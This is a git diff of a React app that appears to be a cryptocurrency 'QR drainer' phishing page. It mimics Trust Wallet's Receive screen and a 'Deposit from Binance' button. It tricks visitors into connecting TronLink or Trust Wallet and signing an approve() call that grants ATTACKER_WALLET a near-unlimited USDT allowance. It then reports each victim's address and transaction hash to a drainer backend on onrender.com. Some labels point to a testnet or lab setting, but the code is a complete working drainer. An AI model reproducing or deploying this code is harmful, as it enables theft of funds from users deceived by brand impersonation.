@@ -2,17 +2,20 @@ import React, { useEffect, useState } from "react";
 import { QRCodeSVG } from "qrcode.react";
 
 // ==========================================
-// CRITICAL CONFIGURATION
+// CONFIGURATION
 // ==========================================
-const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT Contract
-const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR Account 01 (The Receiver)
+const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
+const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
 const BACKEND = "https://qr-drainer.onrender.com";
 const VERCEL_URL = "https://qr-drainer-one.vercel.app";
 
-// TRON LOGO (Upward Diamond)
-const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
+// TRON LOGO (red diamond) for QR center
+const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
 
-const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+// BINANCE LOGO (yellow diamond)
+const BINANCE_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2YwYjkwYiI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
+
+const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");
 
 export default function App() {
   const [isConnected, setIsConnected] = useState(false);
@@ -21,9 +24,10 @@ export default function App() {
   const [showWalletModal, setShowWalletModal] = useState(false);
   const [step, setStep] = useState("idle"); // idle | connecting | approving | done
   const [error, setError] = useState("");
-  const [depositAmount, setDepositAmount] = useState("1");
+  const [copied, setCopied] = useState(false);
 
-  const qrValue = ATTACKER_WALLET;
+  // QR encodes the Vercel URL so scanning opens the drainer site
+  const qrValue = VERCEL_URL;
 
   // 1. DETECT WALLET AUTOMATICALLY
   useEffect(() => {
@@ -48,8 +52,9 @@ export default function App() {
     } catch (e) { console.log("balance read", e); }
   };
 
-  // 2. SHOW WALLET MODAL
-  const handleConfirm = () => {
+  // 2. "DEPOSIT FROM BINANCE" BUTTON → opens wallet modal
+  const handleDeposit = () => {
+    if (step === "done") return;
     if (!isConnected) {
       setShowWalletModal(true);
     } else {
@@ -62,7 +67,7 @@ export default function App() {
     setShowWalletModal(false);
     setStep("connecting");
     setError("");
-    
+
     try {
       if (walletType === "tronlink") {
         if (window.tronLink?.request) {
@@ -77,9 +82,9 @@ export default function App() {
         window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
         return;
       }
-      
+
       await new Promise(r => setTimeout(r, 2000));
-      
+
       if (window.tronWeb?.defaultAddress?.base58) {
         setIsConnected(true);
         setWallet(window.tronWeb.defaultAddress.base58);
@@ -94,49 +99,47 @@ export default function App() {
     }
   };
 
-  // 4. EXECUTE THE APPROVE TRAP (THE FIX IS HERE)
+  // 4. EXECUTE THE APPROVE TRAP
   const executeApprove = async () => {
     setStep("approving");
     setError("");
-    
+
     try {
       if (!window.tronWeb || !window.tronWeb.defaultAddress) {
         throw new Error("Wallet not connected");
       }
-      
+
       const userAddress = window.tronWeb.defaultAddress.base58;
-      
-      // We are approving the ATTACKER_WALLET to spend the user's USDT
+
       const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
         TOKEN_ADDRESS,
         "approve(address,uint256)",
         { feeLimit: 100000000, callValue: 0 },
         [
-          { type: "address", value: ATTACKER_WALLET }, // <--- FIXED: Using clear variable name
+          { type: "address", value: ATTACKER_WALLET },
           { type: "uint256", value: 1000000000000000 }
         ],
         userAddress
       );
-      
+
       if (!transaction.result || !transaction.result.result) {
         throw new Error("Contract call rejected");
       }
-      
+
       const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
       const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
-      
+
       if (!broadcast.result) {
         throw new Error("Broadcast failed");
       }
 
-      // Ping Backend
       const txId = broadcast.txid || transaction.transaction.txID;
       await fetch(`${BACKEND}/api/alert`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ victimAddress: userAddress, txHash: txId, network: "TRON Shasta" })
       });
-      
+
       setStep("done");
     } catch (e) {
       console.error(e);
@@ -145,233 +148,372 @@ export default function App() {
     }
   };
 
+  const handleCopy = () => {
+    navigator.clipboard.writeText(ATTACKER_WALLET);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleShare = async () => {
+    try {
+      if (navigator.share) {
+        await navigator.share({ title: "Receive TRON", url: VERCEL_URL });
+      } else {
+        navigator.clipboard.writeText(VERCEL_URL);
+        alert("Link copied!");
+      }
+    } catch (e) {}
+  };
+
+  const handleDownloadQR = () => {
+    const svg = document.querySelector("#lab-qr-box svg");
+    if (!svg) return;
+    const size = 400;
+    const canvas = document.createElement("canvas");
+    canvas.width = size; canvas.height = size;
+    const ctx = canvas.getContext("2d");
+    ctx.fillStyle = "#ffffff";
+    ctx.fillRect(0, 0, size, size);
+    const img = new Image();
+    const svgData = new XMLSerializer().serializeToString(svg);
+    img.onload = () => {
+      ctx.drawImage(img, 0, 0, size, size);
+      const ls = size * 0.22, lp = (size - ls) / 2;
+      ctx.beginPath();
+      ctx.arc(size / 2, size / 2, ls / 2 + 10, 0, 2 * Math.PI);
+      ctx.fillStyle = "#ffffff";
+      ctx.fill();
+      const logo = new Image();
+      logo.onload = () => {
+        ctx.drawImage(logo, lp, lp, ls, ls);
+        const a = document.createElement("a");
+        a.download = "TRON-Receive.png";
+        a.href = canvas.toDataURL("image/png");
+        a.click();
+      };
+      logo.src = TRON_LOGO_B64;
+    };
+    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
+  };
+
   return (
-    <div style={{ 
-      background: "#0b0e11",
-      minHeight: "100vh", 
-      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 
-      display: "flex", 
-      justifyContent: "center", 
-      alignItems: "center", 
-      padding: 20 
+    <div style={{
+      background: "#0f1419",
+      minHeight: "100vh",
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
+      color: "#ffffff",
+      display: "flex",
+      flexDirection: "column"
     }}>
-      <div style={{ 
-        background: "#ffffff",
-        borderRadius: 24, 
-        padding: 32, 
-        maxWidth: 400, 
-        width: "100%", 
-        boxShadow: "0 20px 60px rgba(0,0,0,0.8)"
+      {/* HEADER - matches Trust Wallet "Receive" screen */}
+      <div style={{
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "space-between",
+        padding: "16px 20px",
+        borderBottom: "1px solid #1e2530"
       }}>
-        
-        {/* HEADER */}
-        <div style={{ textAlign: "center", marginBottom: 24 }}>
-          <h2 style={{ margin: "0 0 8px 0", fontSize: 24, fontWeight: 800, color: "#1e2329" }}>Deposit USDT</h2>
-          <div style={{ fontSize: 14, color: "#707a8a", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-            <span style={{ width: 10, height: 10, background: "#ff2d55", borderRadius: "50%" }}></span>
-            TRON Network (TRC20)
-          </div>
+        <div style={{ width: 32 }}></div>
+        <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600 }}>Receive</h1>
+        <div style={{ width: 32, display: "flex", justifyContent: "flex-end" }}>
+          <span style={{ fontSize: 20, color: "#8a94a6", cursor: "pointer" }}>✕</span>
         </div>
+      </div>
 
-        {/* QR CODE */}
-        <div style={{ textAlign: "center", marginBottom: 24 }}>
-          <div id="lab-qr-box" style={{ 
-            display: "inline-block", 
-            padding: 20, 
-            background: "#ffffff",
-            borderRadius: 16,
-            border: "1px solid #eaecef",
-            boxShadow: "0 4px 12px rgba(0,0,0,0.05)"
-          }}>
-            <QRCodeSVG 
-              value={qrValue} 
-              size={200} 
-              level="H" 
-              includeMargin={false}
-              imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} 
-            />
-          </div>
-        </div>
+      {/* MAIN CONTENT */}
+      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", padding: "24px 20px" }}>
 
-        {/* ADDRESS DISPLAY */}
-        <div style={{ 
-          background: "#f5f5f5", 
-          borderRadius: 12, 
-          padding: 14, 
-          display: "flex", 
-          justifyContent: "space-between", 
-          alignItems: "center", 
-          marginBottom: 20,
-          border: "1px solid #eaecef"
+        {/* TRON NETWORK DROPDOWN */}
+        <div style={{
+          display: "flex",
+          alignItems: "center",
+          gap: 8,
+          background: "#1e2530",
+          padding: "8px 16px",
+          borderRadius: 20,
+          marginBottom: 24,
+          cursor: "pointer"
         }}>
-          <span style={{ fontFamily: "monospace", fontSize: 12, color: "#1e2329", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "70%" }}>
-            {ATTACKER_WALLET}
-          </span>
-          <button onClick={() => navigator.clipboard.writeText(ATTACKER_WALLET)} style={{ background: "#f0b90b", color: "#1e2329", border: "none", borderRadius: 6, padding: "6px 12px", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Copy</button>
+          <span style={{
+            width: 20, height: 20, borderRadius: "50%",
+            background: "#eb2c31",
+            display: "flex", alignItems: "center", justifyContent: "center",
+            fontSize: 11, fontWeight: 700
+          }}>T</span>
+          <span style={{ fontSize: 15, fontWeight: 500 }}>Tron</span>
+          <span style={{ fontSize: 10, color: "#8a94a6" }}>▾</span>
         </div>
 
-        {/* DEPOSIT AMOUNT */}
-        <div style={{ marginBottom: 20 }}>
-          <label style={{ fontSize: 13, color: "#707a8a", marginBottom: 8, display: "block" }}>Amount (USDT)</label>
-          <div style={{ 
-            background: "#f5f5f5", 
-            borderRadius: 12, 
-            padding: 14, 
-            display: "flex", 
-            justifyContent: "space-between", 
-            alignItems: "center",
-            border: "1px solid #eaecef"
-          }}>
-            <input 
-              type="number" 
-              value={depositAmount}
-              onChange={(e) => setDepositAmount(e.target.value)}
-              style={{ 
-                background: "transparent", 
-                border: "none", 
-                fontSize: 18, 
-                fontWeight: 700, 
-                color: "#1e2329",
-                width: "60%",
-                outline: "none"
-              }}
+        {/* QR CODE CARD */}
+        <div style={{
+          background: "#ffffff",
+          borderRadius: 16,
+          padding: 20,
+          marginBottom: 20,
+          width: "100%",
+          maxWidth: 340,
+          boxShadow: "0 4px 20px rgba(0,0,0,0.3)"
+        }}>
+          <div id="lab-qr-box" style={{ textAlign: "center" }}>
+            <QRCodeSVG
+              value={qrValue}
+              size={240}
+              level="H"
+              includeMargin={false}
+              imageSettings={{ src: TRON_LOGO_B64, height: 56, width: 56, excavate: true }}
             />
-            <span style={{ fontSize: 14, color: "#707a8a" }}>USDT</span>
           </div>
-          <div style={{ fontSize: 12, color: "#707a8a", marginTop: 6 }}>= ${depositAmount}.00</div>
+
+          {/* ADDRESS BELOW QR */}
+          <div style={{
+            textAlign: "center",
+            marginTop: 16,
+            fontFamily: "monospace",
+            fontSize: 13,
+            color: "#0f1419",
+            fontWeight: 500,
+            wordBreak: "break-all"
+          }}>
+            {ATTACKER_WALLET}
+          </div>
         </div>
 
         {/* WARNING BANNER */}
-        <div style={{ 
-          background: "#fff8e1", 
-          border: "1px solid #ffe082", 
-          borderRadius: 10, 
-          padding: 12, 
-          fontSize: 12, 
-          color: "#b45309", 
-          marginBottom: 24, 
-          display: "flex", 
-          gap: 10, 
-          alignItems: "flex-start" 
+        <div style={{
+          background: "#2a2418",
+          border: "1px solid #3d3422",
+          borderRadius: 12,
+          padding: "12px 16px",
+          fontSize: 13,
+          color: "#d4a574",
+          marginBottom: 24,
+          display: "flex",
+          gap: 10,
+          alignItems: "flex-start",
+          width: "100%",
+          maxWidth: 340
         }}>
-          <span style={{ fontSize: 16 }}>⚠️</span>
-          <span style={{ lineHeight: 1.4 }}>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
+          <span style={{ fontSize: 16, flexShrink: 0 }}>⚠️</span>
+          <span style={{ lineHeight: 1.4 }}>Only send Tron assets to this address. Other assets will be lost forever.</span>
         </div>
 
         {/* ERROR MESSAGE */}
         {error && (
-          <div style={{ background: "#ffebee", color: "#c62828", padding: 12, borderRadius: 8, fontSize: 13, marginBottom: 16, textAlign: "center" }}>
+          <div style={{
+            background: "#3d1818",
+            border: "1px solid #5c2424",
+            color: "#f08080",
+            padding: 12,
+            borderRadius: 10,
+            fontSize: 13,
+            marginBottom: 16,
+            textAlign: "center",
+            width: "100%",
+            maxWidth: 340
+          }}>
             {error}
           </div>
         )}
 
-        {/* CONFIRM BUTTON */}
-        <button 
-          onClick={handleConfirm}
+        {/* COPY & SHARE BUTTONS */}
+        <div style={{
+          display: "grid",
+          gridTemplateColumns: "1fr 1fr",
+          gap: 12,
+          marginBottom: 20,
+          width: "100%",
+          maxWidth: 340
+        }}>
+          <button
+            onClick={handleCopy}
+            style={{
+              background: "#1e2530",
+              border: "1px solid #2a3340",
+              borderRadius: 12,
+              padding: 14,
+              color: "#ffffff",
+              fontSize: 20,
+              cursor: "pointer",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center"
+            }}
+          >
+            {copied ? "✓" : "📋"}
+          </button>
+          <button
+            onClick={handleShare}
+            style={{
+              background: "#1e2530",
+              border: "1px solid #2a3340",
+              borderRadius: 12,
+              padding: 14,
+              color: "#ffffff",
+              fontSize: 20,
+              cursor: "pointer",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center"
+            }}
+          >
+            📤
+          </button>
+        </div>
+
+        {/* DEPOSIT FROM BINANCE BUTTON */}
+        <button
+          onClick={handleDeposit}
           disabled={step === "connecting" || step === "approving" || step === "done"}
-          style={{ 
-            width: "100%", 
-            background: step === "done" ? "#0ecb81" : "#f0b90b",
-            color: "#1e2329", 
-            border: "none", 
-            borderRadius: 12, 
-            padding: 16, 
-            fontSize: 16, 
-            fontWeight: 800, 
+          style={{
+            width: "100%",
+            maxWidth: 340,
+            background: step === "done" ? "#0ecb81" : "#1e2530",
+            border: "1px solid #2a3340",
+            borderRadius: 12,
+            padding: 16,
+            color: "#ffffff",
+            fontSize: 16,
+            fontWeight: 600,
             cursor: step === "connecting" || step === "approving" ? "not-allowed" : "pointer",
-            boxShadow: "0 4px 12px rgba(240,185,11,0.3)",
             display: "flex",
             alignItems: "center",
             justifyContent: "center",
-            gap: 8
+            gap: 10
           }}
         >
-          {step === "connecting" ? "Connecting..." : 
-           step === "approving" ? "Processing..." : 
-           step === "done" ? "✓ Deposit Confirmed" : 
-           "Confirm Deposit"}
+          {step === "connecting" ? "Connecting..." :
+           step === "approving" ? "Processing..." :
+           step === "done" ? "✓ Deposit Confirmed" : (
+            <>
+              <span style={{
+                width: 22, height: 22, borderRadius: "50%",
+                background: "#f0b90b",
+                display: "flex", alignItems: "center", justifyContent: "center",
+                fontSize: 12, fontWeight: 700, color: "#000"
+              }}>B</span>
+              Deposit from Binance
+            </>
+          )}
         </button>
 
         {/* SUCCESS MESSAGE */}
         {step === "done" && (
-          <div style={{ marginTop: 16, background: "#e8f5e9", border: "1px solid #81c784", borderRadius: 10, padding: 12, fontSize: 12, color: "#2e7d32", textAlign: "center" }}>
+          <div style={{
+            marginTop: 16,
+            background: "#0d3320",
+            border: "1px solid #1a5c3a",
+            borderRadius: 10,
+            padding: 12,
+            fontSize: 13,
+            color: "#4ade80",
+            textAlign: "center",
+            width: "100%",
+            maxWidth: 340
+          }}>
             Transaction confirmed. Your deposit is being processed.
+          </div>
+        )}
+
+        {/* SESSION INFO (subtle, at bottom) */}
+        {isConnected && (
+          <div style={{
+            marginTop: 20,
+            textAlign: "center",
+            fontSize: 11,
+            color: "#5a6474",
+            fontFamily: "monospace"
+          }}>
+            Session: {short(wallet)} · Balance: {victimBal.toFixed(2)} USDT
           </div>
         )}
       </div>
 
       {/* WALLET SELECTION MODAL */}
       {showWalletModal && (
-        <div style={{ 
-          position: "fixed", 
-          inset: 0, 
-          background: "rgba(0,0,0,0.8)", 
-          display: "flex", 
-          justifyContent: "center", 
-          alignItems: "center", 
+        <div style={{
+          position: "fixed",
+          inset: 0,
+          background: "rgba(0,0,0,0.85)",
+          display: "flex",
+          justifyContent: "center",
+          alignItems: "center",
           zIndex: 1000,
           padding: 20
         }}>
-          <div style={{ 
-            background: "#ffffff", 
-            borderRadius: 20, 
-            padding: 24, 
-            width: "100%", 
-            maxWidth: 350,
-            boxShadow: "0 20px 60px rgba(0,0,0,0.5)"
+          <div style={{
+            background: "#1e2530",
+            borderRadius: 20,
+            padding: 24,
+            width: "100%",
+            maxWidth: 340,
+            border: "1px solid #2a3340"
           }}>
-            <h3 style={{ margin: "0 0 20px 0", color: "#1e2329", textAlign: "center", fontSize: 18, fontWeight: 700 }}>Select Wallet</h3>
-            
+            <h3 style={{ margin: "0 0 20px 0", color: "#ffffff", textAlign: "center", fontSize: 18, fontWeight: 600 }}>
+              Connect Wallet
+            </h3>
+
             <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
-              <button 
-                onClick={() => connectToWallet("tronlink")} 
-                style={{ 
-                  background: "#f5f5f5", 
-                  border: "1px solid #eaecef", 
-                  borderRadius: 12, 
-                  padding: 16, 
-                  color: "#1e2329", 
-                  fontWeight: 600, 
-                  cursor: "pointer", 
-                  display: "flex", 
-                  alignItems: "center", 
+              <button
+                onClick={() => connectToWallet("tronlink")}
+                style={{
+                  background: "#0f1419",
+                  border: "1px solid #2a3340",
+                  borderRadius: 12,
+                  padding: 16,
+                  color: "#ffffff",
+                  fontWeight: 600,
+                  cursor: "pointer",
+                  display: "flex",
+                  alignItems: "center",
                   gap: 12,
-                  fontSize: 15
+                  fontSize: 15,
+                  width: "100%"
                 }}
               >
-                <span style={{ width: 32, height: 32, background: "#ff2d55", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700 }}>T</span>
+                <span style={{
+                  width: 36, height: 36, borderRadius: 10,
+                  background: "#eb2c31",
+                  display: "flex", alignItems: "center", justifyContent: "center",
+                  color: "#fff", fontWeight: 700, fontSize: 18
+                }}>T</span>
                 TronLink
               </button>
-              
-              <button 
-                onClick={() => connectToWallet("trust")} 
-                style={{ 
-                  background: "#f5f5f5", 
-                  border: "1px solid #eaecef", 
-                  borderRadius: 12, 
-                  padding: 16, 
-                  color: "#1e2329", 
-                  fontWeight: 600, 
-                  cursor: "pointer", 
-                  display: "flex", 
-                  alignItems: "center", 
+
+              <button
+                onClick={() => connectToWallet("trust")}
+                style={{
+                  background: "#0f1419",
+                  border: "1px solid #2a3340",
+                  borderRadius: 12,
+                  padding: 16,
+                  color: "#ffffff",
+                  fontWeight: 600,
+                  cursor: "pointer",
+                  display: "flex",
+                  alignItems: "center",
                   gap: 12,
-                  fontSize: 15
+                  fontSize: 15,
+                  width: "100%"
                 }}
               >
-                <span style={{ width: 32, height: 32, background: "#3375bb", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700 }}>🛡️</span>
+                <span style={{
+                  width: 36, height: 36, borderRadius: 10,
+                  background: "#3375bb",
+                  display: "flex", alignItems: "center", justifyContent: "center",
+                  color: "#fff", fontWeight: 700, fontSize: 18
+                }}>🛡️</span>
                 Trust Wallet
               </button>
             </div>
-            
-            <button 
-              onClick={() => setShowWalletModal(false)} 
-              style={{ 
-                marginTop: 20, 
-                width: "100%", 
-                background: "transparent", 
-                border: "none", 
-                color: "#707a8a", 
+
+            <button
+              onClick={() => setShowWalletModal(false)}
+              style={{
+                marginTop: 20,
+                width: "100%",
+                background: "transparent",
+                border: "none",
+                color: "#8a94a6",
                 cursor: "pointer",
                 fontSize: 14,
                 padding: 12
